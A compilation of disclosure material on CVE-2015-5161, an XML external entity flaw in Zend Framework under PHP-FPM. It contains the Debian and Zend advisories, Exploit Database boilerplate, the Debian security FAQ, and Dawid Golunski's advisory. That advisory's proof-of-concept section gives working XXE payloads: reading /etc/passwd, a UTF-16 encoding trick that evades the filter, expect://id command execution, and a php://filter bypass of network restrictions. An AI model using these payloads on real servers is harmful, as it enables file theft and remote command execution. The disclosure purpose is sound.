Package        : zendframework
CVE ID         : CVE-2015-5161

Dawid Golunski discovered that when running under PHP-FPM in a threaded
environment, Zend Framework, a PHP framework, did not properly handle
XML data in multibyte encoding. This could be used by remote attackers
to perform an XML External Entity attack via crafted XML data.

For the oldstable distribution (wheezy), this problem has been fixed
in version 1.11.13-1.1+deb7u3.

For the stable distribution (jessie), this problem has been fixed in
version 1.12.9+dfsg-2+deb8u3.

For the testing distribution (stretch), this problem has been fixed
in version 1.12.14+dfsg-1.

For the unstable distribution (sid), this problem has been fixed in
version 1.12.14+dfsg-1.

We recommend that you upgrade your zendframework packages.

# ZF2015-06: XXE/XEE vector when using ZendXml on multibyte payloads

[ZF2014-01](ZF2014-01.html) addressed potential XML eXternal
Entity (XXE) injection and XML Entity Expansion (XEE) vectors in Zend Framework
components that consume XML. The solution provided at the time was creation of a
new component, [ZendXml](https://github.com/zendframework/ZendXml), which
mitigates the vectors, and which we then incorporated into all components that
consume XML.

However, an independent security researcher recently discovered a vector that
remained open in ZendXml when running under PHP-FPM (PHP's FastCGI Process
Manager) when in a threaded environment: if the XML payload is in a multibyte
encoding, the heuristic we provide to detect XXE/XEE vectors can fail.

## Action Taken

The underlying problem is threading support for libxml2 in PHP, which is what
forced us to use a heuristic detection under PHP-FPM in the first place. That
problem [has been fixed in the upstream PHP project](https://bugs.php.net/bug.php?id=64938),
but it only applies to PHP versions 5.5 at 5.5.22 and higher, PHP 5.6 at 5.6.6
and higher, and the PHP 7 development branch. This means that, in order to
protect all users of Zend Framework, we had to create better heuristic detection
when using an older version of PHP.

We updated our heuristic to do the following:

* If a Byte Order Mark (BOM) is detected, we use that encoding for the file
  encoding.
* If no BOM is present, we compare the opening characters against sequences in
  known encodings to determine the file encoding, defaulting to UTF-8 if no
  match is made.
* The file encoding is used to determine if a charset encoding is provided in
  the XML declaration.
* We loop through each of the discovered charset and file encodings to encode
  the sequence `<!ENTITY` and test for the encoded string in the document. If
  discovered, the heuristic fails, and we mark the document as a security
  violation.

For users of PHP 5.5 >= 5.5.22, PHP 5.6 >= 5.6.6, and PHP 7 development
builds, we never use the heuristic, and instead use the tools provided by
libxml2 to prevent external entity loading and entity expansions.

The following components/libraries were patched, at the version specified:

* ZendXml, version 1.0.1
* Zend Framework 1, version 1.12.14
* Zend Framework 2, versions 2.4.6 and 2.5.2

This vulnerability has also been disclosed as [CVE-2015-5161](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5161).

## Recommendations

If you use any Zend Framework components that consume XML, and use or will use
PHP-FPM during deployment, we recommend upgrading to one of these versions
immediately.

=============================================
- Release date: 12.08.2015
- Discovered by: Dawid Golunski
- Severity: High
- CVE-ID: CVE-2015-5161
=============================================

I. VULNERABILITY
-------------------------

Zend Framework <= 2.4.2     XML eXternal Entity Injection (XXE) on PHP FPM
Zend Framework <= 1.12.13

II. BACKGROUND
-------------------------

- Zend Framework

From http://framework.zend.com/about/ website:

"Zend Framework 2 is an open source framework for developing web applications
and services using PHP 5.3+. Zend Framework 2 uses 100% object-oriented code and
utilises most of the new features of PHP 5.3, namely namespaces, late static
binding, lambda functions and closures.

Zend Framework 2 evolved from Zend Framework 1, a successful PHP framework with
over 15 million downloads."

- PHP FPM

http://php.net/manual/en/install.fpm.php

"FPM (FastCGI Process Manager) is an alternative PHP FastCGI implementation with
 some additional features (mostly) useful for heavy-loaded sites."

Starting from release 5.3.3 in early 2010, PHP merged the php-fpm fastCGI
process manager into its codebase. However PHP-FPM was available earlier as a
separate project (http://php-fpm.org/).

III. INTRODUCTION
-------------------------

The XML standard defines a concept of external entites.
XXE (XML eXternal Entity) attack is an attack on an application that parses XML
input from untrusted sources using incorrectly configured XML parser.
The application may be forced to open arbitrary files and/or network resources.
Exploiting XXE issues on PHP applications may also lead to denial of service or
in some cases (for example, when an 'expect' PHP module is installed) lead to
command execution.

An independent security reserach of Zend Framework revealed that it is
possible to bypass XXE security controls within the framework in case
the PHP application using Zend XML related classes (e.g Zend_XmlRpc_Server,
Zend_Feed, Zend_Config_Xml etc.) from Zend Framework is served via PHP FPM.
Bypassing the controls may allow XXE attacks and lead to the aforementioned
exploitation possibilities on systems where the XML parser is set to resolve
entities.

IV. DESCRIPTION
-------------------------

The security controls within the Zend Framework mitigate the XXE attack vectors
by first calling libxml_disable_entity_loader(), and then looping
through the DOMDocument nodes testing if any is of type: XML_DOCUMENT_TYPE_NODE
If so, an exception is raised and PHP script execution is halted.

These controls have been included in the scan() function of a Zend_Xml_Security
class located in the following paths depending on the code branch of Zend
Framework:

ZendFramework-1.12.13/library/Zend/Xml/Security.php

ZendFramework-2.4.2/library/ZendXml/Security.php

In case of the latest version of ZendFramework-1.12.13,
the relevant code blocks from the scan() function look as follows:

---[library/Zend/Xml/Security.php ]---

    public static function scan($xml, DOMDocument $dom = null)
    {
        if (self::isPhpFpm()) {
            self::heuristicScan($xml);
        }

        if (!self::isPhpFpm()) {
            $loadEntities = libxml_disable_entity_loader(true);
            $useInternalXmlErrors = libxml_use_internal_errors(true);
        }

        // Load XML with network access disabled (LIBXML_NONET)
        $result = $dom->loadXml($xml, LIBXML_NONET);
        restore_error_handler();

        if (!self::isPhpFpm()) {
            libxml_disable_entity_loader($loadEntities);
            libxml_use_internal_errors($useInternalXmlErrors);
        }

        if (!$result) {
            return false;
        }

        // Scan for potential XEE attacks using ENTITY, if not PHP-FPM
        if (!self::isPhpFpm()) {
            foreach ($dom->childNodes as $child) {
                if ($child->nodeType === XML_DOCUMENT_TYPE_NODE) {
                    if ($child->entities->length > 0) {
                        require_once 'Exception.php';
                        throw new Zend_Xml_Exception(self::ENTITY_DETECT);
                    }
                }
            }
        }

        if (isset($simpleXml)) {
            $result = simplexml_import_dom($dom);
            if (!$result instanceof SimpleXMLElement) {
                return false;
            }
            return $result;
        }
        return $dom;

--------------------------------------

As we can see from the code, the application disables the entity loader
(via libxml_disable_entity_loader), it also disables network access
(LIBXML_NONET), and it additionally scans provided XML for the presence of XML
entities to prevent potential entity expansion attacks.
The code succesfully prevents most XXE attacks.

However, as the PHP libxml_disable_entity_loader() function was reported not
thread safe (the entity loader setting could potentially get overwritten
between hits in FPM processes), Zend Framework does not use it when the
application is hosted in a PHP-FPM environment. Instead, another approach is
taken to prevent the XXE attacks.

In the code above we see the check !self::isPhpFpm() which determines the type
of interface between web server and PHP (through the php_sapi_name() function).
If the SAPI is FPM-CGI (i.e. PHP-FPM) the following heuristicScan function gets
executed:

---[library/Zend/Xml/Security.php ]---

    protected static function heuristicScan($xml)
    {
        if (strpos($xml, '<!ENTITY') !== false) {
            require_once 'Exception.php';
            throw new Zend_Xml_Exception(self::ENTITY_DETECT);
        }
    }

--------------------------------------

It validates provided XML by searching for any entity declaration. It throws an
exception if it finds one.
Although this check cannot be bypassed by simply adding spaces or changing
the characters to lower case (an XML parser would reject such declaration
as invalid), this security check is nevertheless insufficient.

XML format allows for different types of encoding to be used, hence it is
possible to bypass the check by supplying specifically encoded XML content.
For example, a UTF-16 encoding which uses 2-byte characters would be enough to
bypass the ENTITY string check.

Apart from the ENTITY check, the code also adds the aformentioned LIBXML_NONET
parameter to catch entities refering to network resources.
This limitation can also be bypassed as shown in the proof of concept exploit.

This makes the Zend Framework vulnerable to XXE injection attacks.

V. PROOF OF CONCEPT
-------------------------

Below is a simple PHP application using Zend Framework to implement an XML-RPC
server for demonstation:

---[ zend_xmlrpc_server.php ]--

<?php
// Simple XML-RPC SERVER

	function helloworld() {
	    $text = "Hello world! This request was executed via ".php_sapi_name().".";
	    return $text;
	}
	set_include_path("./ZendFramework-1.12.13/library/");
	require_once("./ZendFramework-1.12.13/library/Zend/Loader/Autoloader.php");
	Zend_Loader_Autoloader::getInstance();

	$server = new Zend_XmlRpc_Server();
	$server->addFunction('helloworld');

	echo $server->handle();
?>

-------------------------------

This test application is hosted on an Apache server with PHP-FPM.

Requesting:

POST /zend_poc/zend-xmlrpc-server.php HTTP/1.1
Host: apache-php-fpm

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>helloworld</methodName>
</methodCall>

should return:

<methodResponse><params><param><value><string>Hello world!
This request was executed via fpm-fcgi.</string></value></param></params>
</methodResponse>

In order to exploit the XXE vulnerability contained in the Zend framework
an attacker can pass XML data containing external entities similar to:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE methodCall [
  <!ENTITY pocdata SYSTEM "file:///etc/passwd">
]>
<methodCall>
  <methodName>retrieved: &pocdata;</methodName>
</methodCall>

Feeding the above data to the zend-xmlrpc-server.php script will result in
an error:

<int>631</int></value></member><member><name>faultString</name><value>
<string>Failed to parse request</string></value></member></struct></value>
</fault></methodResponse>

which is due to the heuristicScan ENTITy detection.

We can now encode the data to avoid the check.

$ cat poc-utf8.xml |  sed 's/UTF-8/UTF-16/' \
	| iconv -f UTF-8 -t UTF-16 >poc-utf16.xml

Hex representation of the UTF-16 encoded XML file (including the change in
the xml header to reflect the new encoding) looks as follows:

$ hexdump -C poc-utf16.xml

As can be seen on the hexdump, the ENTITY word is encoded using 2-byte
characters.

Resupplying the encoded data contained in poc-utf16.xml to the Zend XMLRPC
application, depending on the underlying libxml library, may result in a
password file retrival from the remote server:

$ wget -q -O /dev/stdout http://apache-phpfpm/zend_poc/zend-xmlrpc-server.php \
--post-file=poc-utf16.xml

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse><fault><value><struct><member><name>faultCode</name><value>
<int>620</int></value></member><member><name>faultString</name><value><string>
Method "retrieved: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
[cut]
" does not exist</string></value></member></struct></value></fault>
</methodResponse>

If the password file is not returned, an attacker may try another version
of an XXE attack using parameter entities and an out-of-band communication.
Both of these can be used to exploit the vulnerability in Zend Framework on
a greater number of libxml configurations.

Remote command execution may also be possible if the remote system has an
'expect' php module (libexpect-php) installed.
If this is the case, we can for example execute 'id' command via injecting
the entity:

<!ENTITY pocdata SYSTEM "expect://id">

which should return a result similar to:

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse><fault><value><struct><member><name>faultCode</name><value>
<int>620</int></value></member><member><name>faultString</name><value>
<string>Method "retrieved: uid=33(www-data) gid=33(www-data)
groups=33(www-data) " does not exist</string></value></member>

A separate POC exploit (zend-xmlrpc-exploit-cmd-exec.sh) is included which
runs commands with parameters and also implements parameter entities/OOB
communication.

As mentioned in the description of this vulnerability, the Zend Framework
adds a LIBXML_NONET flag to the loadXML() call in order to prevent reaching
network resources through XXE.

As a result, requesting a network resource such as http://192.168.57.10 via XXE
injection will fail.

This can be bypassed by using php://filter wrapper inside an entity, e.g:

<!ENTITY pocdata SYSTEM "php://filter/read=convert.base64-encode/
resource=http://192.168.57.10">

This will return a base64 encoded response from the remote server bypassing
the LIBXML_NONET restriction:

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse><fault><value><struct><member><name>faultCode</name><value><int>620</int>
</value></member><member><name>faultString</name><value><string>Method "
retrieved: PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDMuMiBGaW5hb
C8vRU4iPgo8aHRtbD4KIDxoZWFkPgogIDx0aXRsZT5JbmRleCBvZiAvPC90aXRsZT4KIDwvaGVhZ

j0idG9wIj48aW1nIHNyYz0iL2ljb[cut]

This vulnerability may also lead to Denial of Service if for example the attacker
requests /dev/random file through XXE. This will cause the application to block
on the endless input from the random generator pseudo device, until the maximum
execution time is reached.
Sending multiple requests of such kind would exhaust the maximum number of
threads that the web server can create.

VI. BUSINESS IMPACT
-------------------------

An unauthenticated remote exploitation may be possible on applications which
make use of Zend_XmlRpc_Server with a public XML-RPC endpoint as demonstrated
in this advisory.
Authentication in case of XML-RPC is not required for exploitation
as the XML needs to be processed first in order for the application to read
the credentials passed from the login data within the xml-formatted input.

This issue should be marked as high/critical due to the wide deployment of Zend
Framework (which includes some major CMS and e-commerce applications), the
number of Zend XML classes affected, low complexity of exploitation, as well
as a possibility of an unauthenticated remote exploitation.
There is also a growing number of servers set up to serve PHP code with PHP-FPM,
especially in web hosting environments which need to respond to heavy load.

VII. SYSTEMS AFFECTED
-------------------------

All systems making use of Zend Framework in versions starting from
1.12.4 and 2.1.6 up to the latest versions of Zend Framework 1.12.13 (released
2015-05-20) and 2.4.2 (released 2015-05-11) contain the XXE injection
vulnerability described in this advisory.

All Zend Framework classes making use of XML and calling the vulnerable
Zend_Xml_Security::scan() function are affected by this issue:

Zend/Amf/Parse/Amf0/Deserializer.php
Zend/Amf/Parse/Amf3/Deserializer.php
Zend/Config/Xml.php
Zend/Dom/Query.php
Zend/Feed/Abstract.php
Zend/Feed/Entry/Abstract.php
Zend/Feed/Entry/Atom.php
Zend/Feed.php
Zend/Feed/Reader.php
Zend/Feed/Writer/Renderer/Entry/Atom.php
Zend/Gdata/App/Base.php
Zend/Gdata/App.php
Zend/Gdata/Gapps/ServiceException.php
Zend/Gdata/YouTube.php
Zend/Json.php
Zend/Mobile/Push/Message/Mpns/Raw.php
Zend/Rest/Client/Result.php
Zend/Search/Lucene/Document/Docx.php
Zend/Search/Lucene/Document/OpenXml.php
Zend/Search/Lucene/Document/Pptx.php
Zend/Search/Lucene/Document/Xlsx.php
Zend/Serializer/Adapter/Wddx.php
Zend/Service/Amazon/Ec2/Response.php
Zend/Service/Amazon.php
Zend/Service/Amazon/SimpleDb/Response.php
Zend/Service/Audioscrobbler.php
Zend/Service/Delicious.php
Zend/Service/Ebay/Finding.php
Zend/Service/Flickr.php
Zend/Service/SlideShare.php
Zend/Service/SqlAzure/Management/Client.php
Zend/Service/Technorati.php
Zend/Service/WindowsAzure/Diagnostics/ConfigurationInstance.php
Zend/Service/WindowsAzure/Management/Client.php
Zend/Service/WindowsAzure/Storage.php
Zend/Service/Yahoo.php
Zend/Soap/Server.php
Zend/Soap/Wsdl.php
Zend/XmlRpc/Request.php
Zend/XmlRpc/Response.php

The vulnerability can be exploited in applications using vulnerable version
of the framework, where PHP code is served with PHP-FPM, and when the xml parser
installed in the system is set up to resolves entities.

PHP-FPM can be set up on popular web servers such as Apache, or Nginx
on Linux/Unix, as well as Windows systems (as per the 'fpm on cygwin' setup
guides available on the Internet).

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

=== Content from legalhackers.com_4dc75d59_20250125_062458.html ===
=============================================
- Release date: 12.08.2015
- Discovered by: Dawid Golunski
- Severity: High
- CVE-ID: CVE-2015-5161
=============================================
I. VULNERABILITY
-------------------------
Zend Framework <= 2.4.2 XML eXternal Entity Injection (XXE) on PHP FPM
Zend Framework <= 1.12.13
II. BACKGROUND
-------------------------
- Zend Framework
From http://framework.zend.com/about/ website:
"Zend Framework 2 is an open source framework for developing web applications
and services using PHP 5.3+. Zend Framework 2 uses 100% object-oriented code and
utilises most of the new features of PHP 5.3, namely namespaces, late static
binding, lambda functions and closures.
Zend Framework 2 evolved from Zend Framework 1, a successful PHP framework with
over 15 million downloads."
- PHP FPM
http://php.net/manual/en/install.fpm.php
"FPM (FastCGI Process Manager) is an alternative PHP FastCGI implementation with
some additional features (mostly) useful for heavy-loaded sites."
Starting from release 5.3.3 in early 2010, PHP merged the php-fpm fastCGI
